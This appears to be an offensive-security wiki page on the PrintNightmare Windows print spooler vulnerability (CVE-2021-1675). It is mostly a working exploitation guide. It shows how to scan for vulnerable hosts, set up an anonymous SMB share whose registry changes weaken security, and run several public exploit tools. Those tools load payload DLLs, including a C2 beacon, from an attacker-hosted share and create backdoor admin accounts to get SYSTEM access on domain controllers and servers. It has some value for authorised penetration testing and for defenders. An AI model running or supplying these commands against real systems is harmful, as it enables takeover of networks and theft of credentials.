# PrintNightmare

[<mark style="color:green;">**CVE-2021-1675**</mark>](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-1675) <mark style="color:green;">**is a critical remote code execution and local privilege escalation vulnerability dubbed "PrintNightmare."**</mark>

The print spooler service is vulnerable to remote code execution that leverages a compromised user account, either domain-joined or local account, to take full control of a system as the NT SYSTEM user. Proof-of-concept (PoC) code has been made publicly available for this new vulnerability leaving every Windows system at extreme risk.&#x20;

**An adversary exploiting this vulnerability can leverage a domain-joined account, regardless of permissions, to take full control as NT SYSTEM on any domain-joined Windows system.** This includes servers and Domain Controllers. An adversary exploiting this vulnerability can also leverage a local account to take full control as NT SYSTEM on any Windows system that the local account is valid.

## <mark style="color:red;">Requirements</mark>

* <mark style="color:green;">**Spooler Service**</mark> <mark style="color:green;"></mark><mark style="color:green;">enabled (Mandatory)</mark>
* <mark style="color:green;">Server with patches < June 21</mark>
* <mark style="color:green;">DC with</mark> <mark style="color:green;"></mark><mark style="color:green;">`Pre Windows 2000 Compatibility`</mark> <mark style="color:green;"></mark><mark style="color:green;">group</mark>
* <mark style="color:green;">Server with registry key</mark> <mark style="color:green;"></mark><mark style="color:green;">`HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint\NoWarningNoElevationOnInstall`</mark> <mark style="color:green;"></mark><mark style="color:green;">= (DWORD) 1</mark>
* <mark style="color:green;">Server with registry key</mark> <mark style="color:green;"></mark><mark style="color:green;">`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`</mark> <mark style="color:green;"></mark><mark style="color:green;">= (DWORD) 0</mark>

## <mark style="color:red;">Target Detection</mark>

We can use `rpcdump.py` from impacket to scan for potential vulnerable hosts, if it returns a value, it could be vulnerable

```python
# impacket
python3 ./rpcdump.py @10.0.2.10 | egrep 'MS-RPRN|MS-PAR'
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol



# it was all a dream
git clone https://github.com/byt3bl33d3r/ItWasAllADream
cd ItWasAllADream && poetry install && poetry shell
itwasalladream -u user -p Password123 -d domain 10.10.10.10/24
docker run -it itwasalladream -u username -p Password123 -d domain 10.10.10.10
```

## <mark style="color:red;">Tools</mark>

{% embed url="https://github.com/cube0x0/CVE-2021-1675" %}

{% embed url="https://github.com/calebstewart/CVE-2021-1675" %}

{% embed url="https://github.com/calebstewart/CVE-2021-1675" %}

{% embed url="https://github.com/outflanknl/PrintNightmare" %}

## <mark style="color:red;">Exploitation</mark>

#### here we use the [python exploit](https://github.com/cube0x0/CVE-2021-1675) because it can do the job remotely.

```python
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

```shell
CVE-2021-1675.py [-h] [-hashes LMHASH:NTHASH] [-target-ip ip address] [-port [destination port]] target share
```

### <mark style="color:orange;">SMB configuration</mark>

#### Easiest way to host payloads is to use samba and modify `/etc/samba/smb.conf` to allow anonymous access

```tsconfig
[global]
    map to guest = Bad User
    server role = standalone server
    usershare allow guests = yes
    idmap config * : backend = tdb
    smb ports = 445

[smb]
    comment = Samba
    path = /tmp/
    guest ok = yes
    read only = no
    browsable = yes
    force user = smbuser
```

#### <mark style="color:green;">From windows it's also possible</mark>

```powershell
mkdir C:\share
icacls C:\share\ /T /grant Anonymous` logon:r
icacls C:\share\ /T /grant Everyone:r
New-SmbShare -Path C:\share -Name share -ReadAccess 'ANONYMOUS LOGON','Everyone'
REG ADD "HKLM\System\CurrentControlSet\Services\LanManServer\Parameters" /v NullSessionPipes /t REG_MULTI_SZ /d srvsvc /f #This will overwrite existing NullSessionPipes
REG ADD "HKLM\System\CurrentControlSet\Services\LanManServer\Parameters" /v NullSessionShares /t REG_MULTI_SZ /d share /f
REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f
REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v RestrictAnonymous /t REG_DWORD /d 0 /f
# Reboot
```

#### example:

```python
python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\192.168.1.215\smb\addCube.dll'
python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 'C:\addCube.dll'
```

### <mark style="color:orange;">other methods</mark>

[SharpNightmare](https://github.com/cube0x0/CVE-2021-1675)

```python
# require a modified Impacket: https://github.com/cube0x0/impacket
python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\192.168.1.215\smb\addCube.dll'
python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 'C:\addCube.dll'
## LPE
SharpPrintNightmare.exe C:\addCube.dll
## RCE using existing context
SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll' 'C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_addb31f9bff9e936\Amd64\UNIDRV.DLL' '\\192.168.1.20'
## RCE using runas /netonly
SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll'  'C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL' '\\192.168.1.10' hackit.local domain_user Pass123
```

[Invoke-Nightmare](https://github.com/calebstewart/CVE-2021-1675)

```python
## LPE only (PS1 + DLL)
Import-Module .\cve-2021-1675.ps1
Invoke-Nightmare # add user `adm1n`/`P@ssw0rd` in the local admin group by default
Invoke-Nightmare -DriverName "Dementor" -NewUser "d3m3nt0r" -NewPassword "AzkabanUnleashed123*" 
Invoke-Nightmare -DLL "C:\absolute\path\to\your\bindshell.dll"
```

[Mimikatz v2.2.0-20210709+](https://github.com/gentilkiwi/mimikatz/releases)

```python
## LPE
misc::printnightmare /server:DC01 /library:C:\Users\user1\Documents\mimispool.dll
## RCE
misc::printnightmare /server:CASTLE /library:\\10.0.2.12\smb\beacon.dll /authdomain:LAB /authuser:Username /authpassword:Password01 /try:50
```

[PrintNightmare - @outflanknl](https://github.com/outflanknl/PrintNightmare)

```python
PrintNightmare [target ip or hostname] [UNC path to payload Dll] [optional domain] [optional username] [optional password]
```
